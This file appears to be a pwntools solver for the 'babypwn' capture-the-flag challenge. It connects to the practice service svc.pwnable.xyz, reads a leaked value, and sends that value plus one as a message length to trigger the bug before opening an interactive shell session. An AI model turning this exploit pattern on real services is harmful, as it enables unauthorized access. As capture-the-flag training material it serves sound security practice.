#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './babypwn' 

LOCAL = False

#os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote('svc.pwnable.xyz', 30000)

# Leak address
r.recvuntil('Leak: ')
leak = int(r.recvline().strip(), 16)
print(f'Leaked address: {leak:#04x}')

# Send leaked address + 1
r.sendlineafter('Length of your message: ', str(leak + 1))
r.sendlineafter('Enter your message: ', 'pwned');

r.interactive()
